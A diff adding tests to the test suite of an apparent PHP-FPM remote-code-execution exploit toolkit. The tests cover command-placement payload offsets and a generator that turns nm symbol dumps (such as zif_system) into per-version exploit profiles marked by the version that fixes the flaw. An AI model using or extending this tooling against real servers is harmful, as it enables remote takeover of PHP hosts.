@@ -21,6 +21,7 @@ ROOT = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(ROOT / "tools"))
 
 import php2shell_fpm as fpm  # noqa: E402
+import php2shell_fpm_profile as profile_gen  # noqa: E402
 
 D = 0x7F07BE280000      # lab-observed stale struct address
 K = 0xFE8               # lab-observed reclaim content offset
@@ -167,6 +168,36 @@ class EndgamePayloadTests(unittest.TestCase):
         val = self.buf[self._off(D + 0x898):self._off(D + 0x898) + len(CMD)]
         self.assertEqual(val, CMD)
         self.assertEqual(self.buf[self._off(D + 0x898) + len(CMD)], 0)
+
+
+class ProfileGeneratorTests(unittest.TestCase):
+    NM = ("0000000000386460 t zif_system\n"
+          "0000000000549890 T zval_ptr_dtor\n"
+          "0000000000a04660 B basic_globals\n")
+
+    def test_parse_nm_symbols(self):
+        symbols = profile_gen.parse_nm(self.NM)
+        self.assertEqual(symbols, {
+            "zif_system": 0x386460,
+            "zval_ptr_dtor": 0x549890,
+            "basic_globals": 0xA04660,
+        })
+
+    def test_parse_nm_rejects_missing_symbol(self):
+        with self.assertRaisesRegex(ValueError, "missing symbols"):
+            profile_gen.parse_nm("0000000000386460 t zif_system\n")
+
+    def test_build_draft_copies_geometry_and_marks_unverified(self):
+        template = json.loads(
+            (ROOT / "profiles" / "8.4.26-fpm.json").read_text())
+        draft = profile_gen.build_draft("8.4.25",
+                                        profile_gen.parse_nm(self.NM), template)
+        self.assertFalse(draft["verified"])
+        self.assertFalse(draft["rce"])
+        self.assertEqual(draft["fixed_in"], "8.4.27")
+        self.assertEqual(draft["libphp"]["zif_system"], "0x386460")
+        self.assertEqual(draft["fpm"]["basic_globals"], "0xa04660")
+        self.assertEqual(draft["fpm"]["leak"], template["fpm"]["leak"])
 
 
 class PathConfigTests(unittest.TestCase):
